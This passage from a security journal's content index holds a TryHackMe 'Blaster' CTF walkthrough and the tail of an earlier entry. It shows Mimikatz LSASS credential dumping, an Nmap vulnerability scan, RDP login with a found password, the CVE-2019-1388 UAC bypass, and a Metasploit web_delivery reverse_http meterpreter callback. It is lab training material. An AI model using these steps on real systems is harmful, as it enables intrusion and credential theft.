going to loot LSASS now using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;load kiwi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It turns out that Windows loads &lt;em&gt;unhashed&lt;/em&gt; passwords into LSASS for any users with scheduled jobs!&lt;/p&gt;\n&lt;h2 id=&quot;past-exploitation&quot;&gt;Past-exploitation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#past-exploitation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Hashes dumped using hashdump can be cracked offline using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/John-the-Ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/John-the-Ripper&quot;&gt;John the Ripper&lt;/a&gt;. It can be helpful to know a little about &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; tickets at this point&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 39 min&lt;/p&gt;","rssInclude":true},"journals/2021-12-08":{"slug":"journals/2021-12-08","filePath":"journals/2021-12-08.md","title":"Blaster","links":["spells/Nmap","spells/gobuster","spells/XFreeRDP","spells/meterpreter"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Blaster” on TryHackMe\n\n\n\nMission start!\nThe CTF background notes that we’ll be attacking a Windows box. So no ping responses again.\nActivate forward scanners and launch proton torpedoes\nThe machine we’ll be attacking is at 10.10.223.185. As usual, we’ll start out with an Nmap scan:\nsudo nmap -v -oA blaster -Pn -A -T4 -sS -script vuln \\\n          -p- 10.10.223.185\nWhich gives us:\n# Nmap 7.92 scan initiated Wed Dec  8 19:55:54 2021 as: nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.223.185\nHost is up (0.23s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 0.013 days (since Wed Dec  8 19:54:04 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   34.47 ms  10.13.0.1\n2   ... 3\n4   351.16 ms 10.10.223.185\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Wed Dec  8 20:12:16 2021 -- 1 IP address (1 host up) scanned in 982.31 seconds\n\nLooks like IIS running on port 80. Let’s go take a peek.\n…And, it’s just the default IIS “hello world” page. Looks a damn sight prettier than Apache’s.\nSince there’s nothing obvious here (and because the CTF is prompting us to do so), let’s sic gobuster on this to see if there’s anything interesting that’s not linked to the (default) index page.\ngobuster \\\n\t-t 10 dir \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \\\n\t-u http://10.10.223.185/\nThere is a hidden directory here, and browsing to it reveals an entire “Retro Fanatics” website. All posts are by “Wade”.\nPoking around a bit more reveals a somewhat cryptic comment on a post:\n\nLeaving myself a note here just in case I forget how to spell it: parzival\n\nWho wants to bet that this is Wade’s password?\nLet’s load up XFreeRDP and see if we can log in, shall we?\nxfreerdp /dynamic-resolution +clipboard /cert:ignore \\\n         /v:10.10.223.185 /u:Wade /p:parzival\nBoom!\nBreaching the control room\nThere’s no obvious files when pocking around except an hhupd.exe file on the desktop, and IE’s history is empty.\nSince I know we’re looking for a CVE name, at this point I just used the Windows File Explorer to search Wade’s home directory for “CVE”. And lo-and-behold, there’s a cached HTML file in C:\\Users\\Wade\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Low\\IE\\7Z6YUWVY called cvename[1].htm which contains a website referencing CVE-2019-1388 (it looks like a slightly older version of the MITRE CVE page on CVE-2019-1388).\n(I feel like the approach I just used — making an educated guess about what the CTF was looking for and then just searching for it — is kind of a cop-out. But, the hint for this question states that I should check IE’s history, which I did… So perhaps the room’s broken?)\nAnyways, I’m guessing that the hhupd.exe file on the desktop is the one that will exploit this vulnerability, since it’s badged as needing administrative privileges and CVE-2019-1388 is a vulnerability in the UAC screen.\nIn fact, a search for “CVE-2019-1388 exploit” pulls up a page that references hhupd.exe and helpfully links to a YouTube video demoing how this exploit works. It looks like the steps here are:\n\nTry to run hhupd.exe.\nShow details on the UAC prompt.\nClick on the certificate information link.\nClick on the issuer link. This will open up an instance of IE running with elevated permissions in the background.\nExit the UAC dialog.\nBring up the save dialog in IE.\nNavigate to C:/Windows/System32/*.* and open cmd.exe.\n\nThe final flag is in the Administrator’s Desktop folder.\nAdoption into the collective\nTarget information isn’t immediately obvious in Metasploit; after selecting exploit/multi/script/web_delivery we’ll need to run info to see all of the options.\nLet’s set things up and run the exploit:\nset target 2\nset SRVHOST 10.13.26.40\nset LHOST 10.13.26.40\nset payload windows/meterpreter/reverse_http\nrun -j\n\n\n                  \n                  Tip\n                  \n                \n\n\nI found that I needed to set the SRVHOST option to get Metasploit to deliver the exploit on the right interface.\n\n\n\nThis particular exploit outputs and encoded PowerShell script and then starts a local listener to deliver the actual meterpreter shell. All we need to do is cut-and-paste into our elevated shell.\n(For whatever reason, I could only get this exploit working with the 32-bit version of meterpreter and the run -j command. I’m not sure why…)\n\n\n                  \n                  Caution\n                  \n                \n\n\nmeterpreter flags this as being deprecated now; the modern pattern seems to be to background meterpreter and then switch to and exploit the exploit/windows/local/persistence module, probably with set STARTUP SYSTEM.\n\n\n\nElapsed Time: 2 h 15 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/blaster&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Blaster” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;mission-start&quot;&gt;Mission start!&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#mission-start&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The CTF background notes that we’ll be attacking a Windows box. So no ping responses again.&lt;/p&gt;\n&lt;h2 id=&quot;activate-forward-scanners-and-launch-proton-torpedoes&quot;&gt;Activate forward scanners and launch proton torpedoes&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#activate-forward-scanners-and-launch-proton-torpedoes&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The machine we’ll be attacking is at 10.10.223.185. As usual, we’ll start out with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; blaster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.223.185&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Which gives us:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Dec  8 19:55:54 2021 as: nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.223.185\nHost is up (0.23s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 0.013 days (since Wed Dec  8 19:54:04 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   34.47 ms  10.13.0.1\n2   ... 3\n4   351.16 ms 10.10.223.185\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed Dec  8 20:12:16 2021 -- 1 IP address (1 host up) scanned in 982.31 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Looks like IIS running on port 80. Let’s go take a peek.&lt;/p&gt;\n&lt;p&gt;…And, it’s just the default IIS “hello world” page. Looks a damn sight prettier than Apache’s.&lt;/p&gt;\n&lt;p&gt;Since there’s nothing obvious here (and because the CTF is prompting us to do so), let’s sic &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; on this to see if there’s anything interesting that’s not linked to the (default) index page.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.223.185/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;There &lt;em&gt;is&lt;/em&gt; a hidden directory here, and browsing to it reveals an entire “Retro Fanatics” website. All posts are by “Wade”.&lt;/p&gt;\n&lt;p&gt;Poking around a bit more reveals a somewhat cryptic comment on a post:&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Who wants to bet that this is Wade’s password?&lt;/p&gt;\n&lt;p&gt;Let’s load up &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/XFreeRDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XFreeRDP&quot;&gt;XFreeRDP&lt;/a&gt; and see if we can log in, shall we?&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /v:10.10.223.185&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /u:Wade&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /p:parzival&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Boom!&lt;/p&gt;\n&lt;h2 id=&quot;breaching-the-control-room&quot;&gt;Breaching the control room&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#breaching-the-control-room&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;There’s no obvious files when pocking around except an hhupd.exe file on the desktop, and IE’s history is empty.&lt;/p&gt;\n&lt;p&gt;Since I know we’re looking for a CVE name, at this point I just used the Windows File Explorer to search Wade’s home directory for “CVE”. And lo-and-behold, there’s a cached HTML file in &lt;code&gt;C:\\Users\\Wade\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Low\\IE\\7Z6YUWVY&lt;/code&gt; called &lt;code&gt;cvename[1].htm&lt;/code&gt; which contains a website referencing CVE-2019-1388 (it looks like a slightly older version of the &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;MITRE CVE page on CVE-2019-1388&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;\n&lt;p&gt;(I feel like the approach I just used — making an educated guess about what the CTF was looking for and then just searching for it — is kind of a cop-out. &lt;em&gt;But&lt;/em&gt;, the hint for this question states that I should check IE’s history, which I did… So perhaps the room’s broken?)&lt;/p&gt;\n&lt;p&gt;Anyways, I’m guessing that the hhupd.exe file on the desktop is the one that will exploit this vulnerability, since it’s badged as needing administrative privileges and CVE-2019-1388 is a vulnerability in the UAC screen.&lt;/p&gt;\n&lt;p&gt;In fact, a search for “CVE-2019-1388 exploit” pulls up &lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a page that references hhupd.exe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and helpfully links to &lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a YouTube video demoing how this exploit works&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. It looks like the steps here are:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Try to run hhupd.exe.&lt;/li&gt;\n&lt;li&gt;Show details on the UAC prompt.&lt;/li&gt;\n&lt;li&gt;Click on the certificate information link.&lt;/li&gt;\n&lt;li&gt;Click on the issuer link. This will open up an instance of IE running with elevated permissions in the background.&lt;/li&gt;\n&lt;li&gt;Exit the UAC dialog.&lt;/li&gt;\n&lt;li&gt;Bring up the save dialog in IE.&lt;/li&gt;\n&lt;li&gt;Navigate to &lt;code&gt;C:/Windows/System32/*.*&lt;/code&gt; and open cmd.exe.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The final flag is in the Administrator’s Desktop folder.&lt;/p&gt;\n&lt;h2 id=&quot;adoption-into-the-collective&quot;&gt;Adoption into the collective&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#adoption-into-the-collective&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Target information isn’t immediately obvious in Metasploit; after selecting &lt;code&gt;exploit/multi/script/web_delivery&lt;/code&gt; we’ll need to run &lt;code&gt;info&lt;/code&gt; to see all of the options.&lt;/p&gt;\n&lt;p&gt;Let’s set things up and run the exploit:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set target 2&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set SRVHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set LHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set payload windows/meterpreter/reverse_http&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;run -j&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;I found that I needed to set the SRVHOST option to get Metasploit to deliver the exploit on the right interface.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;This particular exploit outputs and encoded PowerShell script and then starts a local listener to deliver the actual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell. All we need to do is cut-and-paste into our elevated shell.&lt;/p&gt;\n&lt;p&gt;(For whatever reason, I could &lt;em&gt;only&lt;/em&gt; get this exploit working with the 32-bit version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; &lt;em&gt;and&lt;/em&gt; the &lt;code&gt;run -j&lt;/code&gt; command. I’m not sure why…)&lt;/p&gt;\n&lt;blockquote class=&quot;callout caution&quot; data-callout=&quot;caution&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Caution&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; 